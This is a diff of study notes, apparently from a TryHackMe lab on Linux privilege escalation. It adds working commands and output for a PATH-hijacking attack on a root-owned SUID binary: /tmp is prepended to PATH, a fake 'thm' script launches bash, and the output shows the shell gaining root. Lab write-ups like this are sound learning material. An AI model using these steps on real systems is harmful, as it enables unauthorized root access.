@@ -671,7 +671,6 @@ home/murdoch
 4. Can the current user modify $PATH?
 6. Is there a script or app that can be executed that will be affected by this vulnerability?* 
 * User karen has write access to `/home/murdoch/` folder.
-  * Executables have the SUID bit set.
 ```
 ls -la /home/murdoch
 total 32
@@ -679,6 +678,12 @@ drwxrwxrwx 2 root root  4096 Oct 22  2021 .
 drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
 -rwsr-xr-x 1 root root 16712 Jun 20  2021 test
 -rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
+```
+* "test" file has SUID bit set.
+  * Allows file to be executed with permission level of the file owner - root.
+```
+find /home/murdoch -type f -perm -04000 -ls 2>/dev/null
+   256346     20 -rwsr-xr-x   1 root     root        16712 Jun 20  2021 /home/murdoch/test
 ```
 ```
 cat /home/murdoch/thm.py
@@ -703,8 +708,30 @@ sh: 1: thm: not found
 ```
 export PATH=/tmp:$PATH
 ```
-* Create script in `/tmp` folder that changes the user to root and executes the "test" file.
- 
+* Copy `/bin/bash` as “thm” under the `/tmp` folder.
+```
+cd /tmp
+echo "/bin/bash" > thm
+```
+* Give executable rights to copy of `/bin/bash`
+```
+chmod 777 thm
+ls -l thm
+-rwxrwxrwx 1 karen karen 10 Feb 13 14:17 thm
+```
+* "test" path file will run with root privileges.
+```
+cd /home/murdoch
+whoami
+karen
+id
+uid=1001(karen) gid=1001(karen) groups=1001(karen)
+./test
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+```
 * should elevate our privileges
 * 
 ## Privilege Escalation: NFS
